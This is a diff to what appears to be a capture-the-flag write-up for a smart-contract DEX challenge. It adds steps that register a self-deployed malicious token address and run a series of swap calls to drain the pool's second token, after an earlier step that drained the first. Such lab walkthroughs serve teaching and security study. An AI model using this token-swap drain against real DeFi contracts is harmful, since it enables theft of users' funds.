@@ -38,6 +38,7 @@ await contract.approve(instance, 500)
 ```
 t1 = await contract.token1()
 t2 = await contract.token2()
+m = "0x77371CeaddfaE0Fc313592d88CC9bFBCD58CE9aC" // Malicious Token deployed
 ```
 
 - Perform swaps:
@@ -52,3 +53,14 @@ await contract.swap(t2, t1, 45)
 ```
 
 - We have drained token 1 succesfully.
+
+- Now we will drain token 2 using our custom malicious token. We need to approve instance to spend tokens too.
+
+```
+await contract.swap(m, t2, 10)
+await contract.swap(t2, m, 20)
+await contract.swap(m, t2, 24)
+await contract.swap(t2, m, 30)
+await contract.swap(m, t2, 41)
+await contract.swap(t2, m, 45)
+```
